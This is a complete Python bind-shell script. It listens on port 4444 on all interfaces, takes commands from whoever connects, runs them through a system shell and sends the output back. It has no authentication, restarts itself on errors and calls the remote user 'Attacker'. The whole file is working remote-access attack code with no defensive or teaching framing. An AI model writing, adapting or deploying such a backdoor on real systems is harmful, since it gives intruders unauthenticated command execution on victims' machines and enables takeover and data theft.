import socket
import subprocess
import time
import os

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 4444       # Predefined port

def shell(conn):
    current_dir = os.getcwd()  # start in the default working directory

    while True:
        try:
            data = conn.recv(1024)
            if not data:
                print("[!] Attacker disconnected. Closing shell.")
                break

            cmd = data.decode().strip()

            if cmd.lower() == "exit":
                conn.send(b"[+] Closing connection.\n")
                break

            if cmd.startswith("cd"):
                parts = cmd.split(" ", 1)
                if len(parts) > 1:
                    path = parts[1].strip()
                    try:
                        new_dir = os.path.abspath(os.path.join(current_dir, path))
                        os.chdir(new_dir)
                        current_dir = os.getcwd()
                        conn.send(f"[+] Changed directory to {current_dir}\n".encode())
                    except Exception as e:
                        conn.send(f"[!] Failed to change directory: {str(e)}\n".encode())
                else:
                    conn.send(b"[!] Usage: cd <path>\n")
                continue

            # Run normal commands from the current working directory
            output = subprocess.run(cmd, shell=True, capture_output=True, text=True, cwd=current_dir)
            result = output.stdout + output.stderr
            conn.send(result.encode() if result else b"[+] Command executed with no output.\n")

        except Exception as e:
            try:
                conn.send(f"[!] Shell error: {str(e)}\n".encode())
            except:
                pass
            break

def start_bind_shell():
    while True:
        try:
            s = socket.socket()
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.bind((HOST, PORT))
            s.listen(1)
            print(f"[+] Listening on {HOST}:{PORT}...")

            conn, addr = s.accept()
            print(f"[+] Connection from {addr}")

            shell(conn)

            conn.close()
            s.close()

        except Exception as e:
            print(f"[!] Listener error: {str(e)}")
            try:
                s.close()
            except:
                pass
            time.sleep(5)

if __name__ == "__main__":
    start_bind_shell()
